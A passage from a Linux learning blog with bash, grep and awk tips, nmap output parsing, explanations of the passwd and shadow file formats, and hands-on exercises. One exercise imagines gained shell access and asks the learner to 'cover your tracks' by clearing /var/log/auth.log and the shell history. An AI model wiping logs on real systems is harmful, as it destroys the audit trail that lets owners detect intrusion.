</ol></li>
<br>
<li>Tips and Tricks
<ul>
<li>Scan files for a text present in them
Find a way to scan my entire linux system for all files containing a specific string of text. Just to clarify, I'm looking for text within the file, not in the file name.
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>grep -rnw 'directory' -e "pattern" --include={*.c,*.h} --exclude=*.o
</span><span class='line'>-r                    : search recursively
</span><span class='line'>-n                    : print line number
</span><span class='line'>-w                    : match the whole word. 
</span><span class='line'>--include={*.c,*.h}   : Only search through the files which have .c or .h extensions.
</span><span class='line'>--exclude=*.o         : Exclude searching in files with .o extensions.
</span><span class='line'>PS: --exclude or --include parameter could be used for efficient searching. 
</span><span class='line'>
</span><span class='line'>-i, --ignore-case     : 'it DoesNt MatTTer WhaT thE CAse Is'
</span><span class='line'>-v, --invert-match    : 'everything , BUT that text'
</span><span class='line'>-A &lt;NUM>              : Print NUM lines of trailing context after matching lines.
</span><span class='line'>-B &lt;NUM>              : Print NUM lines of trailing context before matching lines.
</span><span class='line'>-a, --text            : Process a binary file as if it were text; this is equivalent to the --binary-files=text option.</span></code></pre></td></tr></table></div></figure>
</li>
<li>We often do mistakes while updating using apt-get which just leaves us with command line access to the system (GUI messed up). Possibly we unintentionally removed some necessary packages.
<br>
<br>
In this case, look for /var/log/apt/history.log, look for the time around which your system was broken. Copy the removed packages
which would be in the format of 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>libapt-inst1.5:amd64 (0.9.7.9+deb7u5, 0.9.7.9+deb7u6), apt-utils:amd64 (0.9.7.9+deb7u5, 0.9.7.9+deb7u6).</span></code></pre></td></tr></table></div></figure>
To reinstall these packages you just need the package name such as 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>libapt-inst1.5, apt-utils.</span></code></pre></td></tr></table></div></figure>

<ul>
<li>Step1: Use sed to search for pattern "), " and replace it with "), \n". This would separate the packages by new line. Within vi ":%s/), /\n/g"</li>
<li>Step2: Use cut -d ":" -f 1 to remove :amd64 and anything after that.</li>
<li>Step3: Now we have to get them back in one line rather than multiple lines. Within vi ":%s/\n/ /g"</li>
</ul>
</li>
<li>Want to keep track of etc directory? 
<br>
Etckeeper may be a bit more advanced, and it is used to put your whole /etc directory under revision control. 
To install and initialize it,
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>apt-get install etckeeper
</span><span class='line'>etckeeper init
</span><span class='line'>cd /etc
</span><span class='line'>git commit -am Initial</span></code></pre></td></tr></table></div></figure> 
After that, you can see pending changes in /etc by cd-ing into it and running 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>git status or git diff</span></code></pre></td></tr></table></div></figure> at any time, and you can see previous, committed changes by running 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>git log or git log -p</span></code></pre></td></tr></table></div></figure> You can override pending changes to any file with the last committed version with 
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>git checkout FILENAME</span></code></pre></td></tr></table></div></figure>
</li>

<li>ls showing full path

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ls -R /path | awk '
</span><span class='line'>/:$/&&f{s=$0;f=0}
</span><span class='line'>/:$/&&!f{sub(/:$/,"");s=$0;f=1;next}
</span><span class='line'>NF&&f{ print s"/"$0 }</span></code></pre></td></tr></table></div></figure>
</li>

<li>
Keyboard shortcuts
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Move to the start of line. Ctrl + a
</span><span class='line'>Move to the end of line. Ctrl + e
</span><span class='line'>Cut from cursor to previous whitespace. Ctrl + w
</span><span class='line'>Cut from cursor to the end of line. Ctrl + k
</span><span class='line'>Paste the last cut text. Ctrl + y</span></code></pre></td></tr></table></div></figure>
Searching history
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Search as you type. Ctrl + r and type the search term;</span></code></pre></td></tr></table></div></figure>
Read here more for <a href="http://www.gnu.org/software/bash/manual/bashref.html#Command-Line-Editing">Command Line Editing</a>

</li>

<li>Awk converting to normal output to csv
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>A B --&gt; "A","B"
</span><span class='line'>
</span><span class='line'>awk '{print "\"" $1 "\",\"" $2"\""}'</span></code></pre></td></tr></table></div></figure>
</li>
<li>
Finding most open ports in nmap scan

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>grep "^[0-9]\+" &lt;nmap file .nmap extension&gt; | grep "\ open\ " | sort | uniq -c | sort -rn | awk '{print "\""$1"\",\""$2"\",\""$3"\",\""$4"\",\""$5" "$6" "$7" "$8" "$9" "$10" "$11" "$12" "$13"\""}' &gt; test.csv</span></code></pre></td></tr></table></div></figure></li>

<li>
xml parsing
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>xmlstarlet sel -t -m "//host[status[@state='up']]" -v "address/@addr" -o " : " -v "status/@reason_ttl" -o " : " -v "hostnames/hostname/@name" -n soudi_ping.xml</span></code></pre></td></tr></table></div></figure>
</li>
</ul>
</li>

<li><strong>Bash equality Tests</strong>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>test       : checks file types and compare values
</span><span class='line'>   -d      : check if the file is a directory
</span><span class='line'>   -e      : check if the file exists
</span><span class='line'>   -f      : check if the file is a regular file
</span><span class='line'>   -g      : check if the file has SGID permissions
</span><span class='line'>   -r      : check if the file is readable
</span><span class='line'>   -s      : check if the file's size is not 0
</span><span class='line'>   -u      : check if the file has SUID permissions
</span><span class='line'>   -w      : check if the file is writeable
</span><span class='line'>   -x      : check if the file is executable</span></code></pre></td></tr></table></div></figure>
Example:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if test -f /etc/foo.txt
</span><span class='line'>then
</span><span class='line'>
</span><span class='line'>It can also be written as 
</span><span class='line'>
</span><span class='line'>if [ -f /etc/foo.txt ]; then
</span><span class='line'>
</span><span class='line'>--square brackets [] form test.
</span><span class='line'>-- There has to be white space surrounding both square bracket</span></code></pre></td></tr></table></div></figure>
List of equality tests:
<ul>
<li>
Checks equality between numbers:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>x -eq y         : Check is x is equals to y
</span><span class='line'>x -ne y         : Check if x is not equals to y
</span><span class='line'>x -gt y         : Check if x is greater than y
</span><span class='line'>x -lt y         : Check if x is less than y</span></code></pre></td></tr></table></div></figure></li>
<li>Checks equality between strings:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>x = y           : Check if x is the same as y
</span><span class='line'>x != y          : Check if x is not the same as y
</span><span class='line'>-n x            : Evaluates to true if x is not null
</span><span class='line'>-z x            : Evaluates to true if x is null.
</span><span class='line'>##Check in the following way --> if [ -z "$VAR" ];</span></code></pre></td></tr></table></div></figure></li>
<br>
</ul>
<strong>Bash Command Substitution</strong>:
<br>
Command substitution allows the output of a command to replace the command itself. Command substitution occurs when a command is enclosed as follows:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$(command)</span></code></pre></td></tr></table></div></figure>
or
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>`command`</span></code></pre></td></tr></table></div></figure>
Bash performs the expansion by executing command and replacing the command substitution with the standard output of the command, with any trailing newlines deleted.
<br>
<strong>Bash For Loop</strong>:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>for i in $( ls ); do
</span><span class='line'>    echo item: $i
</span><span class='line'>done</span></code></pre></td></tr></table></div></figure>
<br>
<strong>Bash If Statement</strong>:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>if [ "foo" = "foo" ]; then
</span><span class='line'>     echo expression evaluated as true
</span><span class='line'>else
</span><span class='line'>     echo expression evaluated as false
</span><span class='line'>fi</span></code></pre></td></tr></table></div></figure>
<br>
<strong>Bash loop thru array of strings</strong>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>## declare an array variable
</span><span class='line'>declare -a arr=("element1" "element2" "element3")
</span><span class='line'>
</span><span class='line'>## now loop through the above array
</span><span class='line'>for i in "${arr[@]}"
</span><span class='line'>do
</span><span class='line'>   echo "$i"
</span><span class='line'>   # or do whatever with individual element of the array
</span><span class='line'>done</span></code></pre></td></tr></table></div></figure>
The value of the variable whose name is in this variable can be found by
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>echo ${!n}</span></code></pre></td></tr></table></div></figure>
For example:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>eth0="$(ip -o -4 address | grep eth0 | awk '{print $4}')"
</span><span class='line'>wlan0="$(ip -o -4 address | grep wlan0 | awk '{print $4}')"
</span><span class='line'>##eth0 and wlan0 contains the subnet of the eth0 and wlan0.
</span><span class='line'>
</span><span class='line'>for interfaces in "eth0" "wlan0"
</span><span class='line'>do
</span><span class='line'>##var would actually get the value of that variable
</span><span class='line'>  var="${!interfaces}"
</span><span class='line'>done</span></code></pre></td></tr></table></div></figure>
Sample Output with ${!interfaces}:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>
</span><span class='line'>10.233.113.136/23</span></code></pre></td></tr></table></div></figure>
Sample Output with ${interfaces}:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>eth0
</span><span class='line'>wlan0</span></code></pre></td></tr></table></div></figure>
</li>
</li>
<br>
<li><strong>Some Important Definitions</strong>:
<br>
We want our information to:
<ul>
<li>be read by only the right people (confidentiality)</li>
<li>only be changed by authorised people or processes (integrity)</li>
<li>be available to read and use whenever we want (availability).</li>
</ul>
<br>
Non-repudiation is about ensuring that users cannot deny knowledge of sending a message or performing some online activity at some later point in time. For example, in an online banking system the user cannot be allowed to claim that they didn’t send a payment to a recipient after the bank has transferred the funds to the recipient’s account.</li>

<ul>Important File Formats:
<li>The <strong>/etc/passwd</strong> file is a colon-separated file that contains the following information:
<ul>
<li>User name</li>
<li>Encrypted password</li>
<li>User ID number (UID)</li>
<li>User's group ID number (GID)</li>
<li>Full name of the user (GECOS)</li>
<li>User home directory</li>
<li>Login shell</li>
</ul>
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root:!:0:0::/:/usr/bin/ksh
</span><span class='line'>daemon:!:1:1::/etc:
</span><span class='line'>bin:!:2:2::/bin:
</span><span class='line'>sys:!:3:3::/usr/sys: 
</span><span class='line'>adm:!:4:4::/var/adm:
</span><span class='line'>uucp:!:5:5::/usr/lib/uucp: 
</span><span class='line'>guest:!:100:100::/home/guest:
</span><span class='line'>nobody:!:4294967294:4294967294::/:
</span><span class='line'>lpd:!:9:4294967294::/:
</span><span class='line'>lp:*:11:11::/var/spool/lp:/bin/false 
</span><span class='line'>invscout:*:200:1::/var/adm/invscout:/usr/bin/ksh
</span><span class='line'>nuucp:*:6:5:uucp login user:/var/spool/uucppublic:/usr/sbin/uucp/uucico
</span><span class='line'>paul:!:201:1::/home/paul:/usr/bin/ksh
</span><span class='line'>jdoe:*:202:1:John Doe:/home/jdoe:/usr/bin/ksh </span></code></pre></td></tr></table></div></figure></li>
<li>The <strong>/etc/shadow</strong> file contains password and account expiration information for users, and looks like this:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>
</span><span class='line'>smithj:Ep6mckrOLChF.:10063:0:99999:7::</span></code></pre></td></tr></table></div></figure>
As with the passwd file, each field in the shadow file is also separated with ":" colon characters, and are as follows:
<ul>
<li>Username, up to 8 characters. Case-sensitive, usually all lowercase. A direct match to the username in the /etc/passwd file.</li>
<li>Password, 13 character encrypted. A blank entry (eg. ::) indicates a password is not required to log in (usually a bad idea), and a ``*'' entry (eg. :*:) indicates the account has been disabled.</li>
<li>The number of days (since January 1, 1970) since the password was last changed.</li>
<li>The number of days before password may be changed (0 indicates it may be changed at any time)</li>
<li>The number of days after which password must be changed (99999 indicates user can keep his or her password unchanged for many, many years)</li>
<li>The number of days to warn user of an expiring password (7 for a full week)</li>
<li>The number of days after password expires that account is disabled</li>
<li>The number of days since January 1, 1970 that an account has been disabled</li>
<li>A reserved field for possible future use</li>
</ul>
</li>
<li>The <strong>/etc/group</strong> file stores group information or defines the user groups. There is one entry per line, and each line has the following format (all fields are separated by a colon (:)
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cdrom:x:24:john,mike,yummy</span></code></pre></td></tr></table></div></figure>
Where,
<ul>
<li>group_name: Name of group.</li>
<li>Password: Generally password is not used, hence it is empty/blank. It can store encrypted password. This is useful to implement privileged groups.
Group ID (GID): Each user must be assigned a group ID. You can see this number in your /etc/passwd file.
Group List: It is a list of user names of users who are members of the group. The user names, must be separated by commas.
</ul>
</li>
</ul>
</li>
</ol>


<p><strong>TODO</strong></p>

<p>That was most probably a lot of information, to practice all the it&rsquo;s always better to do some hands on.</p>

<ol>

<li>To Learn Programming, Debugging and Git
<ul>
<li> To learn git, would suggest to do a 15 min tutorial on <a href="try.github.com">try.github.com</a>.</li>
<li> Create a small program using vi with syntax on, compile it using gcc using make.</li>
<li> Debug it using gdb -tui option to see the source code, experiment with breakpoints, and printing values.</li>
<li> Track that program using git, upload them to a remote server, then pull your code, check if its the same.</li>
</ul>
</li>

<li>To learn System administration
<ul>
<li> Change the messages before login, after login. Remember the escapes sequences used in the /etc/issue.  man agetty lists them.</li>
<li> Supposed you got access via shell to a linux system and extract some information from it. Create a script
<ul>
<li>Create a alice, bob, eve with the password "password" HINT: set password using chpasswd, look some examples in google to change from cmdline.</li>
<li>Login from eve.</li>
<li>Copy and preserve all the configuration files from /etc and save it in eve home directory in the folder etc-backup-YYYYMMDD, direct all errors to cp.err</li>
<li>Change the owner of all the files in the folder just created to bob and the group of all the files to alice and change the permission of all the files to 440 i.e r--r-----
HINT: would have to be logined as root</li>
<li>Provide me all the unique shells used by the user present in the system in CAPS. HINT: /etc/passwd file contains all the shells, three four commands would be used.</li>
<li>Cover your tracks, clear out the /var/log/auth.log (Have a look at this file and create a backup before clearing), clean your terminal history
HINT: man pages would help you.</li>
<li>Delete all the user bob, alice, eve. Make sure you delete there files too.</li>
</ul>
</li>
<li> Turn off the ping responses for your system permanently and turn on the Syn-cookies protection mechanism. {Search on Google}</li>
<li> Use your previous script to create three users alice, bob, eve. 
<ul>
<li>-create a folder dept inside it two folder hr, web. </li>
<li>create two group hr and web.</li>
<li>change group of web folder to web and hr to hr.</li>
<li>add alice and bob user to web group</li>
<li>add alice to hr group.</li>
<li>check that bob is not able to enter in the hr folder and alice is able to enter in both hr and web folder</li>
<li>-add user bob to sudo group and check if it is able to run sudo ifconfig ?</li>
</ul>
</li>
<li>Objective to get few IP addresses of Microsoft.com Domains.
<ul>
<li>Download the index.html page of microsoft.com</li>
<li>Every link in html is referred by href. Filter all the href (which would contain the link to different domains for Microsoft)</li>
<li>Sort and find unique list. Get their ip addresses</li>
<li>HINT: Tools such as cut, grep, wget, sort, uniq, host and little bit of bash scripting would be used.</li>
</ul></li>
</ul>
</li>
</ol>

]]></content>
  </entry>
  
</feed>
